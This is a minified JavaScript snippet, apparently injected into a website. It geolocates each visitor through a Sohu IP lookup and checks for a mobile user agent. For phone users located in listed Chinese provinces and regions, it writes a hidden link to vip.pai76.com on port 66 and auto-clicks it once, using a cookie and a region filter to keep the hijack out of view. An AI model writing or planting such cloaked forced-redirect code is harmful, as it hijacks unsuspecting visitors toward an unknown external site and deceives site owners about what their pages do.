var pingbi="省份";var meta=document.createElement("meta");meta.name="viewport";meta.content="initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no";document.getElementsByTagName('head')[0].appendChild(meta);addjs('https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js');addjs('https://pv.sohu.com/cityjson?ie=utf-8');addjs('https://hm.baidu.com/hm.js?1a69a290b4a00f35c039755766677e88');function addjs(src){var script=document.createElement("script");script.type="text/javascript";script.src=src;document.getElementsByTagName('head')[0].appendChild(script)}function getCookie(cname){var name=cname+"=";var ca=document.cookie.split(';');for(var i=0;i<ca.length;i++){var c=ca[i].trim();if(c.indexOf(name)==0)return c.substring(name.length,c.length)}return""}function setCookie(key,val,time){var date=new Date();var expiresHours=time;date.setTime(date.getTime()+expiresHours*2000*1000);document.cookie=key+"="+val+";expires="+date.toGMTString();}setTimeout("beginOK()",4000);function beginOK(){console.log(returnCitySN["cname"]);if(returnCitySN["cname"].indexOf(pingbi)!=-1){return false}var dianxin=navigator.userAgent;var jc=dianxin.match(/(iPad).*OS\s([\d_]+)/),isIphone=!jc&&dianxin.match(/(iPhone\sOS)\s([\d_]+)/),isAndroid=dianxin.match(/(Android)\s+([\d.]+)/),isMobile=isIphone||isAndroid;if(!isMobile){return false}var arrayList=["北京","天津","河北","山西",'内蒙古','辽宁','吉林','黑龙','上海','江苏','浙江','安徽','福建','江西','山东','河南','湖北','湖南','广东','广西','海南','重庆','四川','重庆','贵州','云南','台湾','澳门','新疆','青海','宁夏','甘肃','陕西','西藏'];$.each(arrayList,function(){if(returnCitySN["cname"].indexOf(this)!=-1){if(!getCookie('cos')){document.writeln("<a id='cos_main_2019' rel='noreferrer' href='https://vip.pai76.com:66/?c=4217'></a>");document.getElementById("cos_main_2019").click();setCookie('cos','ok',1)}return}});console.log(111)}
